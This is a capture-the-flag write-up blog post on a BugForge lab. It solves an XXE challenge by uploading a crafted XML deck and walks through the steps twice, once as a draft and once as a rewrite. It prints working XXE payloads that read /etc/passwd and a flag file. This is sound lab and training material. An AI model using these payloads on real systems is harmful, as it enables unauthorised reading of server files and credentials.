---
layout: post
title:  "BugForge - Daily - Tanuki"
date:   2026-01-19 20:02
image:  /images/bug-forge/bugforge-logo.png
tags:   [xxe]
categories: [BugForge]
---

# Daily - Cheesy Does It
><br/><b>Vulnerabilities Covered:</b>
<br/>
 XXE
<br/>
<br/>
<b>Summary:</b>
<br/>
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://app.bugforge.io/">Bugforge.io</a>
<br/>
<br/>

## Solution

### Step 1 – Account Creation & Baseline Review

![Registration Request](/images/bug-forge/daily/Tanuki/xxe/traditional/registration-request-response.png)

Here we check for any role, permission, or privilege-related fields that are assigned or implicitly trusted during account creation.

---

### Step 2 - Testing File Upload
Notice the Import Deck option in the navigation bar. This is a strong indicator that the application supports file uploads.

The note `Note: Only JSON and XML formats are supported` points us that this will probably be an XXE vulnerability as it accepts xml.

Download the sample-deck.json and get AI to generate the equivalent xml.

We'll try the traditional XXE Payload to start with and see if we can read the `/etc/passwd` file. 


We've previously had a vulnerable Tanuki challenge where the XXE was only vulnerable with the xi:include <a href="https://zwarts.dev/posts/2026/01/16/BugForge-Daily-Tanuki/">2026-01-16 Tanuki</a>


![Wrong flag path](/images/bug-forge/daily/Tanuki/xxe/traditional/wrong-path.png)

We'll change the path to ```file:///app/flag.txt```.



![Flag](/images/bug-forge/daily/Tanuki/xxe/traditional/flag.png)

---


### Step 1 – Account Creation & Baseline Review

![Registration Request](/images/bug-forge/daily/Tanuki/xxe/traditional/registration-request-response.png)

The first step is to review the account registration flow and establish a baseline understanding of how new users are created.  
The focus is on identifying any role, permission, or privilege-related fields that may be implicitly trusted or automatically assigned during account creation.

---

### Step 2 – File Upload Testing (XXE)

While navigating the application, the **Import Deck** option in the menu indicates that the application supports file uploads.

The note stating **“Only JSON and XML formats are supported”** suggests that XML parsing is performed server-side, making this functionality a strong candidate for XML External Entity (XXE) testing.

After downloading the provided sample deck, it was converted into an equivalent XML structure to mirror the expected schema.

An initial test was performed using a traditional XXE approach to determine whether external entities are processed by the backend.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE deck [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<deck>
  <name>&file;</name>
  <description>A sample deck</description>
  <category>Example</category>
  <cards>
    <card>
      <front>Test</front>
      <back>Test</back>
    </card>
  </cards>
</deck>
```

Previous Tanuki challenges showed that some instances were only exploitable using XInclude-based techniques <a href="https://zwarts.dev/posts/2026/01/16/BugForge-Daily-Tanuki/">Daily - Tanuki (2026-01-16)</a>, so this behavior was kept in mind during testing.

The first attempt did not return the expected output, indicating that the file path being referenced was incorrect.


![Wrong flag path](/images/bug-forge/daily/Tanuki/xxe/traditional/wrong-path.png)


Based on prior challenge patterns, the file path was adjusted to target the application flag location.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE deck [
  <!ENTITY file SYSTEM "file:///app/flag.txt">
]>
<deck>
  <name>&file;</name>
  <description>A sample deck</description>
  <category>Example</category>
  <cards>
    <card>
      <front>Test</front>
      <back>Test</back>
    </card>
  </cards>
</deck>
```

This change successfully returned the contents of the flag file, confirming the presence of a traditional XXE vulnerability.

![Flag](/images/bug-forge/daily/Tanuki/xxe/traditional/flag.png)

---